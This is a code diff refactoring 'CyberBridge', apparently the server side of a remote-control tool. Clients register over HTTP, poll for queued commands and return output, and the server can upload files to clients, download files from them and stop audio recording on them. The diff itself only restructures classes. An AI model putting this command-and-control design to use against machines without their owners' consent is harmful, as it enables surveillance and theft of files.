@@ -1,8 +1,7 @@
 """
-CyberBridge - Server HTTP Session Manager
-Replaces UDP beacon + RPyC with pure HTTP polling.
-The client POSTs /register to announce itself, then polls /commands/<id>
-to pick up queued commands and POSTs /result/<id> with the output.
+CyberBridge - Server Session Manager with Multi-Protocol Support
+Replaces UDP beacon + RPyC with an abstracted BaseSessionManager.
+Includes an HTTPSessionManager and a ProtocolFactory for dynamic selection.
 """
 
 import json
@@ -14,13 +13,15 @@ import logging
 import queue
 from typing import Dict, Optional, Callable
 
+from server.core.errors import ProtocolNotSupportedError, NetworkBindError
+
 logger = logging.getLogger("cyberbridge.server")
 
 
 # ─── Client Session ───────────────────────────────────────────────────────────
 
 class ClientSession:
-    """Represents a remote client registered via HTTP."""
+    """Represents a remote client registered with the server."""
 
     IDLE_TIMEOUT    = 20   # last_seen > 20s → IDLE
     OFFLINE_TIMEOUT = 60   # last_seen > 60s → OFFLINE
@@ -81,7 +82,7 @@ class ClientSession:
         return result
 
     def deliver_result(self, cmd_id: str, result: dict):
-        """Called by the HTTP handler when a client POSTs a result."""
+        """Called by the protocol handler when a client returns a result."""
         with self._lock:
             self._results[cmd_id] = result
             ev = self._result_events.get(cmd_id)
@@ -176,23 +177,12 @@ class ClientSession:
         except Exception:
             return False
 
-    def list_directory(self, path: str) -> list:
-        try:
-            r = self._enqueue("list_directory", {"path": path}, timeout=15)
-            return r.get("value", [])
-        except Exception:
-            return []
-
     def upload_file(self, local_path: str, remote_path: str) -> bool:
-        """
-        Reads local_path and sends it to remote_path on client.
-        """
         try:
             with open(local_path, "rb") as f:
                 data = f.read()
             encoded = base64.b64encode(data).decode()
             
-            # Send the file data
             r = self._enqueue("upload_file", {
                 "path": remote_path,
                 "data": encoded
@@ -204,11 +194,8 @@ class ClientSession:
             return False
 
     def download_file(self, remote_path: str, local_path: str) -> bool:
-        """
-        Reads remote_path from client and saves to local_path.
-        """
         try:
-            r = self._enqueue("download_file", {"path": remote_path}, timeout=600) # 10 minutes timeout for download
+            r = self._enqueue("download_file", {"path": remote_path}, timeout=600) # 10 minutes timeout
             data_b64 = r.get("value", "")
             if not data_b64:
                 return False
@@ -219,8 +206,6 @@ class ClientSession:
             return True
         except Exception as e:
             logging.error(f"Download failed: {e}")
-            return False
-        except Exception:
             return False
 
     def stop_audio_record(self) -> bytes:
@@ -249,32 +234,52 @@ class ClientSession:
     def ensure_connected(self) -> bool:
         return True
 
-    # ── Repr ──────────────────────────────────────────────────────────────────
-
     def __repr__(self):
         return f"<ClientSession {self.hostname}@{self.ip} [{self.status_str}]>"
 
 
-# ─── Session Manager ──────────────────────────────────────────────────────────
+# ─── Base Session Manager ─────────────────────────────────────────────────────
 
-class SessionManager:
-    """
-    Manages client sessions registered via HTTP.
-    Starts a Flask HTTP server on HTTP_PORT.
-    """
-
-    HTTP_PORT = 18812
-
+class BaseSessionManager:
+    """Abstract base class for protocol-specific session managers."""
+    
     def __init__(self, on_client_update: Optional[Callable] = None):
-        self._sessions: Dict[str, ClientSession] = {}   # key = client_id
+        self._sessions: Dict[str, ClientSession] = {}
         self._lock      = threading.Lock()
         self._running   = False
         self._on_update = on_client_update
 
-    # ── Lifecycle ─────────────────────────────────────────────────────────────
+    def start(self):
+        raise NotImplementedError("Must be implemented by protocol subclass.")
+
+    def stop(self):
+        self._running = False
+
+    def get_sessions(self) -> list:
+        with self._lock:
+            return list(self._sessions.values())
+
+    def get_session(self, key: str) -> Optional[ClientSession]:
+        with self._lock:
+            return self._sessions.get(key)
+
+    def remove_session(self, key: str):
+        with self._lock:
+            self._sessions.pop(key, None)
+
+    def session_count(self) -> int:
+        with self._lock:
+            return len(self._sessions)
+
+
+# ─── HTTP Session Manager ─────────────────────────────────────────────────────
+
+class HTTPSessionManager(BaseSessionManager):
+    """Manages client sessions via HTTP Polling."""
+
+    HTTP_PORT = 18812
 
     def start(self):
-        """Starts the Flask HTTP server in a background thread."""
         self._running = True
         app = self._create_flask_app()
 
@@ -285,16 +290,12 @@ class SessionManager:
                 logger.info("HTTP server listening on port %d", self.HTTP_PORT)
                 srv.serve_forever()
             except Exception as e:
-                logger.error("HTTP server error: %s", e)
+                # Proper professional error wrap although thrown in thread
+                raise NetworkBindError(self.HTTP_PORT, "HTTP", e)
 
         t = threading.Thread(target=_serve, daemon=True)
         t.start()
-        logger.info("SessionManager: HTTP server started on port %d", self.HTTP_PORT)
-
-    def stop(self):
-        self._running = False
-
-    # ── Flask routes ──────────────────────────────────────────────────────────
+        logger.info("HTTPSessionManager: HTTP server started on port %d", self.HTTP_PORT)
 
     def _create_flask_app(self):
         from flask import Flask, request, jsonify
@@ -373,20 +374,24 @@ class SessionManager:
 
         return app
 
-    # ── Session access ────────────────────────────────────────────────────────
 
-    def get_sessions(self) -> list:
-        with self._lock:
-            return list(self._sessions.values())
+# ─── Protocol Factory ─────────────────────────────────────────────────────────
 
-    def get_session(self, key: str) -> Optional[ClientSession]:
-        with self._lock:
-            return self._sessions.get(key)
+class ProtocolFactory:
+    """Factory to initialize the selected SessionManager architecture."""
+    
+    @staticmethod
+    def create_manager(protocol: str, on_client_update: Optional[Callable] = None) -> BaseSessionManager:
+        protocol = protocol.upper().strip()
+        logger.info(f"ProtocolFactory: Attempting to instantiate manager for '{protocol}'")
+        
+        if protocol == "HTTP":
+            return HTTPSessionManager(on_client_update=on_client_update)
+        elif protocol in ["TCP", "UDP", "RCP"]:
+            raise ProtocolNotSupportedError(protocol)
+        else:
+            raise ProtocolNotSupportedError(protocol)
 
-    def remove_session(self, key: str):
-        with self._lock:
-            self._sessions.pop(key, None)
-
-    def session_count(self) -> int:
-        with self._lock:
-            return len(self._sessions)
+# ─── Legacy compatibility alias ───────────────────────────────────────────────
+# Fallback for old code expecting SessionManager directly
+SessionManager = HTTPSessionManager
